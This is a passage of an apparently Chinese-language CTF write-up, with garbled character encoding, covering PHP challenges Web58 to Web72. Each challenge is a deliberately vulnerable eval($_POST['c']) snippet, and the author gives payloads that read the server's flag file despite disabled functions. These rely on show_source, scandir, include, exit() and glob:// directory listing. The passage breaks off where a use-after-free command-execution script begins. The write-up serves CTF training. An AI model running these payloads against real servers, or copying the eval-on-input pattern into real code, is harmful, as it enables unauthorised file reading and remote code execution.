class="string">&quot;))))&quot;</span></span><br><span class="line"><span class="built_in">print</span>(resp)</span><br></pre></td></tr></table></figure><h1 id="web58"><a class="markdownIt-Anchor" href="#web58">#</a> Web58ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>â€‹ä¹ä¸€çœ‹ï¼Œå¥½åƒå¾ˆç®€å•ï¼Œä¸è¿‡ï¼Œå½“æˆ‘ post äº†ä¸€ä¸ª phpinfo ä¹‹åï¼Œå‘ç°äº†å‡½æ•°è¢«ç¦äº†ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Warning: phpinfo() has been disabled for security reasons in /var/www/html/index.php(17) : eval()&#x27;d code on line 1</span><br></pre></td></tr></table></figure><p>â€‹å»ºè®®ç›´æ¥ fuzz ä¸€ä¸‹ï¼Œçœ‹çœ‹å…·ä½“å“ªäº›è¢« ban äº†ï¼Œè¿™é‡Œå°±ç›´æ¥ show_source äº†ï¼š</p><blockquote><p>c=show_source(â€˜flag.phpâ€™);<br>c=highlight_file(next(array_reverse(scandir(pos(localeconv())))));</p></blockquote><h1 id="web59"><a class="markdownIt-Anchor" href="#web59">#</a> Web59ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>â€‹å…·ä½“ä¸çŸ¥é“æœ‰äº›å•¥è¢« ban äº†ï¼Œåªèƒ½ä¸€ä¸ªä¸ªæµ‹ï¼Œç»“æœå’Œä¸Šä¸€é¢˜ä¸€æ ·ï¼Œshow_source ä¾æ—§è¿‡äº†ï¼š</p><blockquote><p>c=show_source(â€œflag.phpâ€);</p></blockquote><h1 id="web60"><a class="markdownIt-Anchor" href="#web60">#</a> Web60ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">é¢˜ç›®ï¼š</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹ä¸€æ¨¡ä¸€æ ·ï¼Œç›´æ¥ç»™ paylaodï¼š</p><blockquote><p>c=show_source(â€œflag.phpâ€);</p></blockquote><h1 id="web61"><a class="markdownIt-Anchor" href="#web61">#</a> Web61ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>â€‹show_source ç™¾è¯•ä¸çˆ½å•Šã€‚</p><blockquote><p>c=show_source(â€œflag.phpâ€);</p></blockquote><h1 id="web62"><a class="markdownIt-Anchor" href="#web62">#</a> Web62ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><blockquote><p>c=show_source(â€œflag.phpâ€);</p></blockquote><h1 id="web63"><a class="markdownIt-Anchor" href="#web63">#</a> Web63ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><blockquote><p>c=show_source(â€œflag.phpâ€);</p></blockquote><h1 id="web64"><a class="markdownIt-Anchor" href="#web64">#</a> Web64ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><blockquote><p>c=show_source(â€œflag.phpâ€);</p></blockquote><h1 id="web65"><a class="markdownIt-Anchor" href="#web65">#</a> Web65ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><blockquote><p>c=show_source(â€œflag.phpâ€);</p></blockquote><h1 id="web66"><a class="markdownIt-Anchor" href="#web66">#</a> Web66ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>â€‹show_source å‡½æ•°è¢« ban äº†ï¼Œhighlight_file æ²¡æœ‰è¢« banï¼Œè¯•è¯•çœ‹ï¼Œç»“æœ flag æ²¡æœ‰åœ¨ flag.php é‡Œï¼Œé€šè¿‡å¦‚ä¸‹ payload å‘ç° flag åœ¨æ ¹ç›®å½•ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;/&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">#Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; .dockerenv [3] =&gt; bin [4] =&gt; dev [5] =&gt; etc [6] =&gt; flag.txt [7] =&gt; home [8] =&gt; lib [9] =&gt; media [10] =&gt; mnt [11] =&gt; opt [12] =&gt; proc [13] =&gt; root [14] =&gt; run [15] =&gt; sbin [16] =&gt; srv [17] =&gt; sys [18] =&gt; tmp [19] =&gt; usr [20] =&gt; var ) </span></span><br></pre></td></tr></table></figure><p>â€‹é‚£å°±ç”¨ highlight_file å»è¯»æ ¹ç›®å½•ï¼š</p><h1 id="web67"><a class="markdownIt-Anchor" href="#web67">#</a> Web67ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>â€‹print_r è¢«è¿‡æ»¤äº†ï¼Œè¯•è¯•çœ‹ var_dumpï¼Œæ²¡æœ‰è¢«è¿‡æ»¤ï¼Œç»§ç»­ scandir å»è¯»ç›®å½•ç»“æ„ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;/&quot;</span>));</span><br><span class="line">c=<span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;/flag.txt&quot;</span>);</span><br></pre></td></tr></table></figure><h1 id="web68"><a class="markdownIt-Anchor" href="#web68">#</a> Web68ï¼š</h1><p>â€‹ç”±äº highlight_file () è¢« ban äº†ï¼Œè¯»ä¸åˆ°æºç ï¼Œæ‰€ä»¥å°±ç›´æ¥å¼€æ‰“äº†ï¼Œå…ˆæµ‹ä¸€ä¸‹ var_dumpï¼Œvar_dump å’Œ scandir éƒ½æ²¡æœ‰è¢« banï¼Œç›´æ¥è¯»æ ¹ç›®å½•ï¼Œæ‰¾åˆ°äº† flag.txtï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;/&quot;</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#array(21) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(10) &quot;.dockerenv&quot; [3]=&gt; string(3) &quot;bin&quot; [4]=&gt; string(3) &quot;dev&quot; [5]=&gt; string(3) &quot;etc&quot; [6]=&gt; string(8) &quot;flag.txt&quot; [7]=&gt; string(4) &quot;home&quot; [8]=&gt; string(3) &quot;lib&quot; [9]=&gt; string(5) &quot;media&quot; [10]=&gt; string(3) &quot;mnt&quot; [11]=&gt; string(3) &quot;opt&quot; [12]=&gt; string(4) &quot;proc&quot; [13]=&gt; string(4) &quot;root&quot; [14]=&gt; string(3) &quot;run&quot; [15]=&gt; string(4) &quot;sbin&quot; [16]=&gt; string(3) &quot;srv&quot; [17]=&gt; string(3) &quot;sys&quot; [18]=&gt; string(3) &quot;tmp&quot; [19]=&gt; string(3) &quot;usr&quot; [20]=&gt; string(3) &quot;var&quot; &#125; </span></span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åå°±æ˜¯å…¶ä»–æ‰‹æ³•äº†ï¼Œæ ¹æ® txt æ–‡ä»¶ï¼Œæ¨æµ‹ flag åº”è¯¥ä¸ä¼šè¢«å½“ä½œ php ä»£ç æ‰§è¡Œï¼Œæ‰€ä»¥è¯•ç€ä½¿ç”¨æ–‡ä»¶åŒ…å«ç­‰æ‰‹æ³•è¯» flagï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">include</span>(<span class="string">&quot;/flag.txt&quot;</span>);</span><br></pre></td></tr></table></figure><h1 id="web69"><a class="markdownIt-Anchor" href="#web69">#</a> Web69ï¼š</h1><p>â€‹ban äº† highlight_fileã€var_dumpï¼Œé‚£å°±ç”¨ var_exportï¼Œè¾“å‡ºç›®å½•ç»“æ„ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="title function_ invoke__">var_export</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;/&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">#array ( 0 =&gt; &#x27;.&#x27;, 1 =&gt; &#x27;..&#x27;, 2 =&gt; &#x27;.dockerenv&#x27;, 3 =&gt; &#x27;bin&#x27;, 4 =&gt; &#x27;dev&#x27;, 5 =&gt; &#x27;etc&#x27;, 6 =&gt; &#x27;flag.txt&#x27;, 7 =&gt; &#x27;home&#x27;, 8 =&gt; &#x27;lib&#x27;, 9 =&gt; &#x27;media&#x27;, 10 =&gt; &#x27;mnt&#x27;, 11 =&gt; &#x27;opt&#x27;, 12 =&gt; &#x27;proc&#x27;, 13 =&gt; &#x27;root&#x27;, 14 =&gt; &#x27;run&#x27;, 15 =&gt; &#x27;sbin&#x27;, 16 =&gt; &#x27;srv&#x27;, 17 =&gt; &#x27;sys&#x27;, 18 =&gt; &#x27;tmp&#x27;, 19 =&gt; &#x27;usr&#x27;, 20 =&gt; &#x27;var&#x27;, )</span></span><br></pre></td></tr></table></figure><p>â€‹ä¹‹å include åŒ…å« /flag.txt æ–‡ä»¶å³å¯å¾—åˆ° flagã€‚</p><h1 id="web70"><a class="markdownIt-Anchor" href="#web70">#</a> Web70ï¼š</h1><p>â€‹é€šè¿‡ var_export è¯»å–æ–‡ä»¶ç›®å½•ç»“æ„ï¼Œå†ç”¨ include åŒ…å« /flag.txtï¼Œå’Œä¸Šé¢å‡ ä¸ªé¢˜æ²¡æœ‰ä»»ä½•åŒºåˆ«ã€‚</p><h1 id="web71"><a class="markdownIt-Anchor" href="#web71">#</a> Web71ï¼š</h1><p>â€‹é™„ä»¶é‡Œç»™äº†æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹æœ‰å‡ ä¸ªç‚¹éœ€è¦æ³¨æ„ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">ob_get_contents</span>();<span class="comment">//å¾—åˆ°ç¼“å†²åŒºçš„æ•°æ®ã€‚</span></span><br><span class="line"><span class="title function_ invoke__">ob_end_clean</span>();<span class="comment">//ä¼šæ¸…é™¤ç¼“å†²åŒºçš„å†…å®¹ï¼Œå¹¶å°†ç¼“å†²åŒºå…³é—­ï¼Œä½†ä¸ä¼šè¾“å‡ºå†…å®¹</span></span><br></pre></td></tr></table></figure><p>â€‹ä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™é‡Œéœ€è¦åœ¨æ‰§è¡Œä¸Šé¢ä¸¤ä¸ªå‡½æ•°ä¹‹å‰ï¼ŒæŠŠç¨‹åºè¾“å‡ºå‡ºæ¥å°±è¡Œäº†ï¼Œè¿™ä¸ªæ—¶å€™ï¼Œå°±å¯ä»¥é€‰æ‹©æå‰ç»“æŸæ‰æ•´ä¸ªç¨‹åºï¼Œå› ä¸ºç¼“å†²åŒºå°±æ˜¯åœ¨ç¨‹åºç»“æŸä¹‹å‰éœ€è¦å°†é‡Œé¢çš„æ‰€æœ‰å†…å®¹å…¨éƒ¨è¾“å‡ºæ‰è¡Œï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="title function_ invoke__">var_export</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/&#x27;</span>));<span class="keyword">exit</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">#array ( 0 =&gt; &#x27;.&#x27;, 1 =&gt; &#x27;..&#x27;, 2 =&gt; &#x27;.dockerenv&#x27;, 3 =&gt; &#x27;bin&#x27;, 4 =&gt; &#x27;dev&#x27;, 5 =&gt; &#x27;etc&#x27;, 6 =&gt; &#x27;flag.txt&#x27;, 7 =&gt; &#x27;home&#x27;, 8 =&gt; &#x27;lib&#x27;, 9 =&gt; &#x27;media&#x27;, 10 =&gt; &#x27;mnt&#x27;, 11 =&gt; &#x27;opt&#x27;, 12 =&gt; &#x27;proc&#x27;, 13 =&gt; &#x27;root&#x27;, 14 =&gt; &#x27;run&#x27;, 15 =&gt; &#x27;sbin&#x27;, 16 =&gt; &#x27;srv&#x27;, 17 =&gt; &#x27;sys&#x27;, 18 =&gt; &#x27;tmp&#x27;, 19 =&gt; &#x27;usr&#x27;, 20 =&gt; &#x27;var&#x27;, )</span></span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åå°±</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">include</span>(<span class="string">&quot;/flag.txt&quot;</span>);<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><h1 id="web72"><a class="markdownIt-Anchor" href="#web72">#</a> Web72ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹scandir è¢«ç¦äº†ï¼Œè¿™é‡Œæ²¡ä»€ä¹ˆæ€è·¯ï¼Œä¸è¿‡ï¼Œè¿™é‡Œæœ‰å¤§ä½¬é€šè¿‡ glob ä¼ªåè®®è¯»å–äº†æ ¹ç›®å½•æ–‡ä»¶åï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;<span class="keyword">echo</span> <span class="variable">$f</span>.<span class="string">&quot;    &quot;</span> ;&#125;<span class="keyword">exit</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">#bin dev etc flag0.txt home lib media mnt opt proc root run sbin srv sys tmp usr var </span></span><br></pre></td></tr></table></figure><p>â€‹é€šè¿‡ include è¯»å–æ–‡ä»¶çš„æ—¶å€™å‘ç°æ²¡æœ‰æƒé™ï¼Œå…ˆåˆ—ä¸€äº›è¯»å–æ–‡ä»¶çš„å‡½æ•°å§ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">readfile</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;example.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);<span class="variable">$content</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$file</span>, <span class="title function_ invoke__">filesize</span>(<span class="string">&quot;example.txt&quot;</span>));<span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="variable">$fileContents</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;example.txt&quot;</span>);</span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åå°±æ˜¯åˆ©ç”¨ uaf è„šæœ¬è¿›è¡Œå‘½ä»¤æ‰§è¡Œäº†ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span 